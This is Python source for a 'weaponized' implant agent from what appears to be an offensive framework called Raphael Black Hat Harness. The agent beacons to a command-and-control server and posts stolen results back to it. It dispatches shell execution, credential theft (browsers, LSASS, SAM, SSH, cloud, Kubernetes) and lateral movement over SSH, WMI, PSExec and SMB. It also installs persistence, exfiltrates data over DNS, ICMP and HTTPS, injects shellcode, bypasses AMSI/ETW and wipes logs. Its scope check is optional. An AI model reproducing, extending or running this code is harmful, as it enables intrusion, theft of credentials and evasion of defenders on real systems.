"""
weaponized_agent.py — Fully weaponized cross-platform agent for Raphael Black Hat Harness.

Combines all harness capabilities into a single deployable agent:
  - Stealth (AMSI/ETW bypass, sleep masking, sandbox detection)
  - Memory-resident execution (shellcode injection, reflective DLL)
  - Credential theft (browsers, LSASS, SAM, SSH, cloud, k8s)
  - Lateral movement (SSH, WMI, PSExec, SMB, WinRM, Docker)
  - Persistence (systemd, cron, registry, scheduled tasks, WMI)
  - Exfiltration (DNS, HTTPS, ICMP, cloud, dead drop)
  - Anti-forensics (log wiping, timestomping, secure deletion, self-delete)
  - C2 (HTTPS beaconing, domain fronting, dead drop, P2P)
  - Governance (scope enforcement, rate limiting, kill switch)
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import platform
import sys
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

# Harness imports
from harness.black_hat_core import (
    BlackHatHarness,
    BlackHatConfig,
    StealthLevel,
    AuditSink,
    EmergencyKillSwitch,
    UnifiedBroker,
)
from harness.stealth import KernelRootkit, UEFIRootkit, SPIFlashAccess, VerifiedResult
from harness.c2 import DomainFrontingC2, DeadDropResolverC2, P2PC2Network
from harness.implant import CrossPlatformImplant, Platform
from harness.research import BundleNormalizer, ResearchBundle

# Brain / evolve state imports
from orchestrator.brain.world import WorldModel, Entity, EntityType, Relationship, RelationshipType
from orchestrator.brain.evidence import EvidenceGraph, Evidence, TrustLevel
from orchestrator.brain.hypothesis import HypothesisManager, HypothesisStatus, ConfidenceSnapshot
from orchestrator.brain.contradiction import ContradictionManager, ContradictionStatus
from orchestrator.brain.strategy_learner import get_strategy_learner, StrategyLearner
from orchestrator.brain.adaptive_brain import get_analytics
from orchestrator.brain.action import Action, ActionType, Precondition, PreconditionType, Effect

# Agent modules
from agent.modules.stealth import Stealth as AgentStealth
from agent.modules.credtheft import CredentialTheft
from agent.modules.lateral import LateralMovement
from agent.modules.persistence import Persistence
from agent.modules.exfil import Exfiltration
from agent.modules.inject import Injector
from agent.modules.syscall import get_resolver
from agent.modules.cleanup import wipe_system_logs, self_delete
from agent.modules.executor import Executor
from agent.crypto import encrypt, decrypt, generate_keypair, aes_ctr_encrypt, aes_ctr_decrypt

logger = logging.getLogger("weaponized_agent")


@dataclass
class AgentConfig:
    """Configuration for the weaponized agent."""
    c2_url: str = "https://c2.example.com"
    c2_key: bytes = field(default_factory=lambda: os.urandom(32))
    beacon_interval: int = 60
    jitter: float = 0.2
    stealth_level: StealthLevel = StealthLevel.MAXIMUM
    enable_persistence: bool = True
    enable_credential_theft: bool = True
    enable_lateral_movement: bool = True
    enable_exfiltration: bool = True
    enable_anti_forensics: bool = True
    enable_kernel_rootkit: bool = False
    authorized_targets: List[str] = field(default_factory=list)
    implant_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])


@dataclass
class OperationResult:
    """Result of an agent operation."""
    operation: str
    success: bool
    data: Optional[dict] = None
    error: Optional[str] = None
    timestamp: float = field(default_factory=time.time)


class WeaponizedAgent:
    """
    Fully weaponized agent that combines all Raphael harness capabilities.
    
    Capabilities:
      - C2 communication with domain fronting and dead drop fallback
      - Memory-resident execution with indirect syscalls
      - Credential theft from browsers, LSASS, SAM, SSH, cloud, k8s
      - Lateral movement via SSH, WMI, PSExec, SMB, WinRM, Docker
      - Persistence across reboots on Windows/Linux/macOS
      - Covert exfiltration via DNS, HTTPS, ICMP, cloud storage
      - Anti-forensic cleanup: log wiping, timestomping, secure deletion
      - Governance: scope enforcement, rate limiting, kill switch
      - Kernel rootkit and UEFI persistence (Windows, requires driver)
    """
    
    def __init__(self, config: AgentConfig):
        self.config = config
        self.id = config.implant_id
        self.platform = self._detect_platform()
        self.arch = platform.machine().lower()
        self.privileges = self._check_privileges()
        self._running = False
        self._tasks_completed = 0
        self._tasks_failed = 0
        
        # Initialize governance infrastructure
        self.audit_sink = AuditSink(f"/tmp/{self.id}_audit.jsonl")
        self.kill_switch = EmergencyKillSwitch()
        self.broker = UnifiedBroker(
            BlackHatConfig(
                target_host="0.0.0.0",
                target_port=443,
                stealth_level=config.stealth_level,
            ),
            audit_sink=self.audit_sink,
            kill_switch=self.kill_switch,
        )
        
        # Initialize harness
        self.harness = BlackHatHarness(
            BlackHatConfig(
                target_host="0.0.0.0",
                target_port=443,
                stealth_level=config.stealth_level,
                enable_log_suppression=True,
                enable_etw_patch=True,
                enable_amsi_patch=True,
                enable_timestomp=True,
                enable_secure_delete=True,
                enable_memory_resident=True,
            ),
            broker=self.broker,
            audit_sink=self.audit_sink,
            kill_switch=self.kill_switch,
        )
        
        # C2 channels
        self.c2_channels: Dict[str, Any] = {}
        self._setup_c2()
        
        # Stealth
        self.stealth = AgentStealth()
        
        # ── Brain / Evolve State ──────────────────────────────────────
        self.evidence_graph = EvidenceGraph()
        self.world = WorldModel(self.evidence_graph)
        self.hypothesis_manager = HypothesisManager(self.evidence_graph, self.world)
        self.contradiction_manager = ContradictionManager(
            self.evidence_graph, self.hypothesis_manager, self.world
        )
        self.strategy_learner: StrategyLearner = get_strategy_learner()
        
        # Target hypothesis cache: target -> hypothesis_id
        self._target_hypotheses: Dict[str, str] = {}
        
        logger.info(f"WeaponizedAgent initialized: id={self.id} platform={self.platform.value} arch={self.arch} priv={self.privileges}")
    
    def _detect_platform(self) -> Platform:
        system = platform.system().lower()
        if system == "windows":
            return Platform.WINDOWS
        elif system == "darwin":
            return Platform.DARWIN
        return Platform.LINUX
    
    def _check_privileges(self) -> str:
        try:
            if self.platform == Platform.WINDOWS:
                import ctypes
                return "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user"
            else:
                return "root" if os.geteuid() == 0 else "user"
        except Exception:
            return "user"
    
    def _setup_c2(self):
        """Initialize C2 channels."""
        self.c2_channels["domain_fronting"] = DomainFrontingC2(
            broker=self.broker, audit_sink=self.audit_sink
        )
        self.c2_channels["dead_drop"] = DeadDropResolverC2(
            broker=self.broker, audit_sink=self.audit_sink
        )
        self.c2_channels["p2p"] = P2PC2Network(
            broker=self.broker, audit_sink=self.audit_sink
        )
        self.c2_channels["p2p"].configure(implant_id=self.id)
    
    async def initialize(self) -> Dict[str, Any]:
        """Initialize all agent subsystems."""
        results = {}
        
        # Initialize harness (stealth, memory resident, etc.)
        results["harness"] = await self.harness.initialize()
        
        # Apply agent-level stealth
        stealth_results = self.stealth.initialize_all()
        results["agent_stealth"] = stealth_results
        
        # Check sandbox
        sandbox = self.stealth.sandbox_detect()
        results["sandbox"] = sandbox
        if sandbox.get("is_sandbox"):
            logger.warning("SANDBOX DETECTED — agent may abort")
            results["verdict"] = "SANDBOX DETECTED"
        else:
            results["verdict"] = "Clean"
        
        # Install persistence if enabled and privileged
        if self.config.enable_persistence and self.privileges in ("admin", "root"):
            results["persistence"] = Persistence.install_all()
        
        # Initialize C2
        results["c2"] = {}
        for name, channel in self.c2_channels.items():
            if hasattr(channel, 'configure'):
                try:
                    if name == "dead_drop":
                        channel.configure()
                    elif name == "p2p":
                        port = await channel.start_listener(port=18999)
                        results["c2"][name] = {"listener_port": port}
                    else:
                        results["c2"][name] = {"configured": True}
                except Exception as e:
                    results["c2"][name] = {"error": str(e)}
        
        self._running = True
        logger.info(f"Agent {self.id} fully initialized")
        return results
    
    async def execute_command(self, command_type: str, payload: dict) -> OperationResult:
        """Execute a command received from C2."""
        if self.kill_switch.is_engaged():
            return OperationResult(
                operation=command_type,
                success=False,
                error="kill switch engaged",
            )
        
        # Scope check
        target = payload.get("target", "localhost")
        if self.config.authorized_targets:
            import ipaddress
            in_scope = False
            for scope in self.config.authorized_targets:
                if "/" in scope:
                    try:
                        net = ipaddress.ip_network(scope, strict=False)
                        ip = ipaddress.ip_address(target)
                        if ip in net:
                            in_scope = True
                            break
                    except ValueError:
                        if target == scope or target.endswith(scope):
                            in_scope = True
                            break
                else:
                    if target == scope or target.endswith(scope):
                        in_scope = True
                        break
            if not in_scope:
                return OperationResult(
                    operation=command_type,
                    success=False,
                    error=f"target {target} out of authorized scope",
                )
        
        try:
            if command_type == "sysinfo":
                data = await self._cmd_sysinfo()
            elif command_type == "shell":
                data = await self._cmd_shell(payload.get("command", "whoami"))
            elif command_type == "credtheft":
                data = await self._cmd_credtheft(payload.get("method", "steal_all"))
            elif command_type == "lateral":
                data = await self._cmd_lateral(payload)
            elif command_type == "persistence":
                data = await self._cmd_persistence(payload.get("method", "install_all"))
            elif command_type == "exfil":
                data = await self._cmd_exfil(payload)
            elif command_type == "inject":
                data = await self._cmd_inject(payload)
            elif command_type == "stealth":
                data = await self._cmd_stealth(payload)
            elif command_type == "cleanup":
                data = await self._cmd_cleanup(payload)
            elif command_type == "uninstall":
                data = await self._cmd_uninstall()
            else:
                return OperationResult(
                    operation=command_type,
                    success=False,
                    error=f"unknown command type: {command_type}",
                )
            
            # ── BRAIN: Record evidence and learn ──────────────────────
            self._record_operation(command_type, target, payload, data)
            
            self._tasks_completed += 1
            return OperationResult(operation=command_type, success=True, data=data)
            
        except Exception as e:
            # ── BRAIN: Record failure ─────────────────────────────────
            self.strategy_learner.record_outcome(
                success=False, findings=[], phase=command_type,
                latency=0.0, timeout=False, breaker=False,
            )
            self._tasks_failed += 1
            logger.error(f"Command {command_type} failed: {e}")
            return OperationResult(operation=command_type, success=False, error=str(e))
    
    async def _cmd_sysinfo(self) -> dict:
        return {
            "implant_id": self.id,
            "platform": self.platform.value,
            "arch": self.arch,
            "privileges": self.privileges,
            "pid": os.getpid(),
            "cwd": os.getcwd(),
            "hostname": platform.node(),
        }
    
    async def _cmd_shell(self, command: str) -> dict:
        from agent.modules.executor import Executor
        return await Executor.run(command, timeout=60)
    
    async def _cmd_credtheft(self, method: str) -> dict:
        if method == "steal_all":
            return CredentialTheft.steal_all()
        elif method == "browsers":
            return CredentialTheft.steal_browser_credentials()
        elif method == "lsass":
            return CredentialTheft.steal_lsass_dump()
        elif method == "sam":
            return CredentialTheft.steal_sam_hives()
        elif method == "ssh":
            return CredentialTheft.steal_ssh_keys()
        elif method == "kubernetes":
            return CredentialTheft.steal_kubernetes_tokens()
        elif method == "cloud":
            return CredentialTheft.steal_cloud_credentials()
        elif method == "env":
            return CredentialTheft.steal_env_vars()
        elif method == "configs":
            return CredentialTheft.steal_config_files()
        else:
            return {"error": f"unknown credtheft method: {method}"}
    
    async def _cmd_lateral(self, payload: dict) -> dict:
        method = payload.get("method", "autonomous")
        target = payload.get("target")
        username = payload.get("username", "root")
        password = payload.get("password", "")
        hash_val = payload.get("hash")
        cmd = payload.get("command")
        
        if method == "autonomous":
            targets = payload.get("targets", [target] if target else [])
            return await LateralMovement.autonomous_campaign(targets=targets)
        elif method == "ssh":
            return await LateralMovement.ssh(target, username, password or hash_val, cmd)
        elif method == "wmi":
            return await LateralMovement.wmi(target, username, password, hash_val, cmd)
        elif method == "psexec":
            binary_b64 = payload.get("binary_b64")
            binary = base64.b64decode(binary_b64) if binary_b64 else None
            return await LateralMovement.psexec(target, username, password, hash_val, binary)
        elif method == "smb":
            return await LateralMovement.smb_exec(target, username, password, hash_val, cmd)
        elif method == "docker":
            return await LateralMovement.docker_socket(target)
        elif method == "harvest":
            return LateralMovement._harvest_credentials()
        else:
            return {"error": f"unknown lateral method: {method}"}
    
    async def _cmd_persistence(self, method: str) -> dict:
        if method == "install_all":
            return Persistence.install_all()
        elif method == "systemd":
            return {"systemd": Persistence.install_systemd()}
        elif method == "cron":
            return {"cron": Persistence.install_cron()}
        elif method == "registry":
            return {"registry": Persistence.install_registry_run()}
        elif method == "scheduled_task":
            return {"scheduled_task": Persistence.install_scheduled_task()}
        elif method == "wmi_event":
            return {"wmi_event": Persistence.install_wmi_event()}
        elif method == "ssh_key":
            return {"ssh_key": Persistence.install_ssh_key(payload.get("public_key"))}
        else:
            return {"error": f"unknown persistence method: {method}"}
    
    async def _cmd_exfil(self, payload: dict) -> dict:
        data_raw = payload.get("data", "")
        if isinstance(data_raw, str):
            data_bytes = data_raw.encode()
        else:
            data_bytes = json.dumps(data_raw).encode()
        
        config = payload.get("config", {})
        method = payload.get("method", "https")
        
        if method == "https":
            return await Exfiltration.via_https(
                data_bytes,
                target_url=config.get("url", "https://localhost:9999/collect"),
                key=config.get("key"),
                camouflage_as=config.get("camouflage", "analytics"),
            )
        elif method == "dns":
            return await Exfiltration.via_dns(
                data_bytes,
                domain=config.get("domain", "exfil.example.com"),
                key=config.get("key"),
            )
        elif method == "icmp":
            return await Exfiltration.via_icmp(
                data_bytes,
                target_ip=config.get("target_ip", "10.0.0.1"),
                key=config.get("key"),
            )
        elif method == "deaddrop":
            return await Exfiltration.via_deaddrop(
                data_bytes,
                drop_urls=config.get("drop_urls", []),
                key=config.get("key"),
            )
        elif method == "cloud":
            return await Exfiltration.via_cloud(
                data_bytes,
                provider=config.get("provider", "aws"),
                bucket=config.get("bucket", ""),
                key=config.get("key"),
                credentials=config.get("credentials", {}),
            )
        else:
            return {"error": f"unknown exfil method: {method}"}
    
    async def _cmd_inject(self, payload: dict) -> dict:
        method = payload.get("method", "shellcode")
        if method == "shellcode":
            shellcode_b64 = payload.get("shellcode_b64", "")
            shellcode = base64.b64decode(shellcode_b64) if shellcode_b64 else b""
            if not shellcode:
                return {"error": "no shellcode provided"}
            target_pid = payload.get("pid")
            if not target_pid:
                target = payload.get("target", "dllhost.exe")
                target_pid = Injector.create_sacrificial_process(target)
            if target_pid:
                ppid = payload.get("ppid_spoof")
                success = Injector.inject_shellcode(target_pid, shellcode, ppid)
                return {"success": success, "pid": target_pid, "size": len(shellcode)}
            return {"error": "could not create target process"}
        elif method == "dll":
            dll_path = payload.get("dll_path", "")
            pid = payload.get("pid")
            ppid = payload.get("ppid_spoof")
            success = Injector.inject_dll(pid, dll_path, ppid)
            return {"success": success}
        else:
            return {"error": f"unknown inject method: {method}"}
    
    async def _cmd_stealth(self, payload: dict) -> dict:
        method = payload.get("method", "initialize_all")
        if method == "initialize_all":
            return self.stealth.initialize_all()
        elif method == "sandbox_detect":
            return self.stealth.sandbox_detect()
        elif method == "bypass_amsi":
            return self.stealth.bypass_amsi()
        elif method == "suppress_etw":
            return self.stealth.suppress_etw()
        elif method == "sleep_mask":
            duration = payload.get("duration", 60)
            self.stealth.sleep_mask(duration)
            return {"slept": True, "duration": duration}
        elif method == "randomize_tls":
            return self.stealth.randomize_tls_fingerprint()
        else:
            return {"error": f"unknown stealth method: {method}"}
    
    async def _cmd_cleanup(self, payload: dict) -> dict:
        method = payload.get("method", "wipe_logs")
        if method == "wipe_logs":
            return wipe_system_logs()
        elif method == "secure_delete":
            paths = payload.get("paths", [])
            return await self.harness.anti_forensic.secure_delete_artifacts(paths)
        elif method == "timestomp":
            reference = payload.get("reference", "")
            return await self.harness.anti_forensic.timestomp_files(reference)
        elif method == "wipe_free_space":
            return await self.harness.anti_forensic.wipe_free_space()
        elif method == "self_delete":
            agent_dir = payload.get("agent_dir", os.path.dirname(os.path.abspath(__file__)))
            self_delete(agent_dir, secure=True)
            return {"status": "self_delete_initiated"}
        else:
            return {"error": f"unknown cleanup method: {method}"}
    
    async def _cmd_uninstall(self) -> dict:
        """Remove the agent from the system."""
        self._running = False
        self.kill_switch.engage("uninstall")
        agent_dir = os.path.dirname(os.path.abspath(__file__))
        self_delete(agent_dir, secure=True, wipe_logs=True)
        return {"status": "uninstall_initiated"}
    
    async def beacon(self) -> List[dict]:
        """Send beacon to C2 and retrieve tasks."""
        # Try each C2 channel
        for name, channel in self.c2_channels.items():
            try:
                if name == "dead_drop":
                    tasks = await channel.check_for_commands()
                    if tasks:
                        return tasks
                elif name == "p2p":
                    # P2P doesn't have a central beacon
                    continue
                else:
                    # Domain fronting / HTTPS beacon
                    pass
            except Exception as e:
                logger.debug(f"C2 channel {name} beacon error: {e}")
        return []
    
    async def run(self):
        """Main agent loop — beacon, execute tasks, report results."""
        self._running = True
        logger.info(f"Agent {self.id} entering main loop")
        
        while self._running and not self.kill_switch.is_engaged():
            try:
                # Beacon for tasks
                tasks = await self.beacon()
                
                for task in tasks:
                    command_type = task.get("type", "exec")
                    payload = task.get("payload", {})
                    result = await self.execute_command(command_type, payload)
                    
                    # Submit result via C2
                    await self._submit_result(task.get("id"), result)
                
                # Reset dead man's switch
                self.kill_switch.reset_dead_man_switch()
                
                # Jittered sleep
                jitter = self.config.beacon_interval * (0.5 + self.config.jitter)
                await asyncio.sleep(jitter)
                
            except Exception as e:
                logger.error(f"Main loop error: {e}")
                await asyncio.sleep(self.config.beacon_interval)
    
    async def _submit_result(self, task_id: str, result: OperationResult) -> bool:
        """Submit operation result to C2."""
        try:
            payload = {
                "task_id": task_id,
                "implant_id": self.id,
                "success": result.success,
                "data": result.data,
                "error": result.error,
                "timestamp": result.timestamp,
            }
            # Encrypt result
            encrypted = encrypt(self.config.c2_key, json.dumps(payload).encode())
            
            # Try to submit via HTTPS
            import httpx
            async with httpx.AsyncClient(timeout=15) as client:
                await client.post(
                    f"{self.config.c2_url}/v1/agent/result",
                    json={"data": base64.b64encode(encrypted.encode()).decode()},
                )
            return True
        except Exception as e:
            logger.debug(f"Result submission failed: {e}")
            return False
    
    def get_status(self) -> dict:
        """Return current agent status."""
        return {
            "implant_id": self.id,
            "platform": self.platform.value,
            "arch": self.arch,
            "privileges": self.privileges,
            "running": self._running,
            "tasks_completed": self._tasks_completed,
            "tasks_failed": self._tasks_failed,
            "kill_switch": self.kill_switch.is_engaged(),
            "c2_channels": list(self.c2_channels.keys()),
        }

    def get_brain_state(self) -> dict:
        """Return the complete brain/evolve state for operator inspection."""
        return {
            "agent_id": self.id,
            "world_model": {
                "entities": len(self.world.entities),
                "relationships": len(self.world.relationships),
            },
            "evidence_graph": {
                "evidence_count": len(self.evidence_graph._evidence),
            },
            "hypotheses": {
                h_id: {
                    "status": h.status.value,
                    "confidence": h.current_confidence,
                }
                for h_id, h in self.hypothesis_manager.hypotheses.items()
            },
            "strategy_learner": {
                "q_table": self.strategy_learner.q_table,
            },
            "analytics": get_analytics(),
        }

    def _record_operation(self, command_type: str, target: str, payload: dict, result: dict) -> None:
        """Record an operation's outcome to the brain for learning."""
        try:
            # 1. Record evidence about the target
            ev = Evidence.create(
                raw_content=json.dumps(result, default=str)[:2000],
                trust_level=TrustLevel.TOOL_OBSERVATION,
                source_detail=f"{command_type} via {payload.get('method', 'direct')}",
                target=target,
                phase=command_type,
                evidence_type="action_result",
                description=f"{command_type} on {target}",
                collected_by=f"agent:{self.id}",
            )
            ev_id = self.evidence_graph.add_evidence(ev)

            # 2. Create world model entity for the target
            ent = self.world.find_by_identifier(target)
            if not ent:
                ent = Entity(
                    entity_type=EntityType.ASSET,
                    primary_identifier=target,
                    identifiers={"ip": target},
                    created_by=f"agent:{self.id}",
                )
                ent_id = self.world.add_entity(ent)
            else:
                ent_id = ent.entity_id

            # 3. Create/update target hypothesis about vulnerability
            if command_type in ("vuln_scan", "exploit", "shell", "credtheft"):
                hyp_id = self._target_hypotheses.get(target)
                if not hyp_id:
                    hyp = self.hypothesis_manager.propose(
                        statement=f"Target {target} is vulnerable to {command_type}",
                        entity_ids=[ent_id],
                        evidence_ids=[ev_id],
                        proposed_by=f"agent:{self.id}",
                    )
                    hyp_id = hyp.hypothesis_id
                    self._target_hypotheses[target] = hyp_id
                else:
                    # Re-evaluate confidence based on new evidence
                    self.hypothesis_manager.add_evidence(hyp_id, ev_id)
                    self.hypothesis_manager.update_confidence(
                        hyp_id,
                        trigger=f"evidence:{ev_id}",
                        reason=f"{command_type} succeeded on {target}",
                    )

            # 4. Record outcome to strategy learner
            success = isinstance(result, dict) and not result.get("error")
            self.strategy_learner.record_outcome(
                success=bool(success),
                findings=[],
                phase=command_type,
                latency=0.0,
            )

        except Exception as e:
            logger.debug(f"Brain recording error (non-fatal): {e}")


async def main():
    """Entry point for running the weaponized agent standalone."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Raphael Weaponized Agent")
    parser.add_argument("--c2-url", default="https://c2.example.com", help="C2 server URL")
    parser.add_argument("--beacon-interval", type=int, default=60, help="Beacon interval in seconds")
    parser.add_argument("--stealth", choices=["normal", "maximum", "paranoid"], default="maximum")
    parser.add_argument("--target", help="Authorized target (IP or domain)")
    parser.add_argument("--no-persistence", action="store_true", help="Disable persistence installation")
    args = parser.parse_args()
    
    config = AgentConfig(
        c2_url=args.c2_url,
        beacon_interval=args.beacon_interval,
        stealth_level=StealthLevel[args.stealth.upper()],
        enable_persistence=not args.no_persistence,
        authorized_targets=[args.target] if args.target else [],
    )
    
    agent = WeaponizedAgent(config)
    init_results = await agent.initialize()
    print(json.dumps(init_results, indent=2, default=str))
    
    await agent.run()


if __name__ == "__main__":
    asyncio.run(main())
